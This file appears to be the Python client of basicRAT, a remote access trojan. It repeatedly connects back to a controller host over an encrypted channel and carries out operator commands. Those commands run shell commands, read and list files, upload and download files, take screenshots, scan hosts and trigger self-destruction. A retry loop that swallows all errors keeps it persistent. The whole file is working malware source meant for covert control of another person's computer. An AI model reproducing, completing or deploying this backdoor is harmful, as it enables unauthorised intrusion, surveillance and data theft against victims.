#!/usr/bin/env python

# Rat

import socket
import sys
import time

from libr import *

# change host you need
HOST = 'localhost'
PORT = 1337

# seconds to wait b
CONN_TIMEOUT = 30


def client_loop(conn, dhkey):
    while True:
        results = ''

        # receive data from server
        data = crypto.decrypt(conn.recv(4096), dhkey)

        # seperate data
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct()

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'cat':
            results = toolkit.cat(action)

        elif cmd == 'download':
            results = toolkit.sendfile(conn, dhkey)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(action)

        elif cmd == 'pwd':
            results = toolkit.pwd()

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'screenshot':
            results = toolkit.screenshot()

        # receive file
        elif cmd == 'upload':
            results = toolkit.recvfile(conn, dhkey)

        results = results.rstrip() + '\n{} completed.'.format(cmd)

        conn.send(crypto.encrypt(results, dhkey))


def main():
    exit_status = 0

    while True:
        conn = socket.socket()

        try:
            # attempt to connect to basicRAT server
            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        dhkey = crypto.diffiehellman(conn)

        # This try/except statement makes the client very resilient, but it's
        # horrible for debugging. It will keep the client alive if the server
        # is torn down unexpectedly, or if the client freaks out.
        try:
            exit_status = client_loop(conn, dhkey)
        except:
            pass

        if exit_status:
            sys.exit(0)


if __name__ == '__main__':
    main()
